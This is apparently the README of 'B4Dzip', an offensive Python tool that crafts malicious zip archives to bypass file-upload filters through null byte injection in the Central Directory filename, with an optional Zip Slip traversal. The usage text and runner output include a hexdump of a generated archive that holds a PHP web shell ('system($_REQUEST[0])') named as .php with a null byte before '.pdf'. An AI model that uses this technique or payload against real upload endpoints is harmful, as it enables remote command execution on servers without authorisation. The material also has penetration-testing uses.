# B4Dzip

The main purpose of this script is to create a zip file for exploiting File Upload using Null Byte injection. The vulnerability
occurs due to an incorrect validation of the Central Directory Header filename.

<!-- USAGE EXAMPLES -->
## Usage

```
python3 main.py  --help
usage: B4Dzip [-h] -F FILE -E EXT -P PAYLOAD [-ZS ZIP_SLIP] [-O OUTPUT_FNAME]

Creates a malicious zip file using the given payload as content and injecting NULL Byte in the given
filename, to bypass validations in the Central Directory Header filename.

optional arguments:
  -h, --help            show this help message and exit
  -F FILE, --file FILE  Filename of the file to compress
  -E EXT, --ext EXT     Extension to append after NULL Byte injection.
  -P PAYLOAD, --payload PAYLOAD
                        Payload filepath
  -ZS ZIP_SLIP, --zip-slip ZIP_SLIP
                        Zip Slip parent directory, something like: ../../../
  -O OUTPUT_FNAME, --output-fname OUTPUT_FNAME
                        Output file name
```
## Using runner

I Highly recommend to see the `runner.sh` file for getting information about usage examples.

```
./runner.sh 
b4d.zip saved successfully.


*********** SUMMARY ***********

Archive:  b4d.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       30  2023-08-30 22:43   7f2f6c24e7de64ed.php
---------                     -------
       30                     1 file


00000000  50 4b 03 04 0a 00 00 00  00 00 69 b5 1e 57 13 aa  |PK........i..W..|
00000010  a2 09 1e 00 00 00 1e 00  00 00 14 00 00 00 37 66  |..............7f|
00000020  32 66 36 63 32 34 65 37  64 65 36 34 65 64 2e 70  |2f6c24e7de64ed.p|
00000030  68 70 3c 3f 70 68 70 20  73 79 73 74 65 6d 28 24  |hp<?php system($|
00000040  5f 52 45 51 55 45 53 54  5b 30 5d 29 3b 20 3f 3e  |_REQUEST[0]); ?>|
00000050  50 4b 01 02 1e 03 0a 00  00 00 00 00 69 b5 1e 57  |PK..........i..W|
00000060  13 aa a2 09 1e 00 00 00  1e 00 00 00 19 00 00 00  |................|
00000070  00 00 00 00 00 00 00 00  a4 81 00 00 00 00 37 66  |..............7f|
00000080  32 66 36 63 32 34 65 37  64 65 36 34 65 64 2e 70  |2f6c24e7de64ed.p|
00000090  68 70 00 2e 70 64 66 50  4b 05 06 00 00 00 00 01  |hp..pdfPK.......|
000000a0  00 01 00 47 00 00 00 50  00 00 00 00 00           |...G...P.....|
000000ad
```
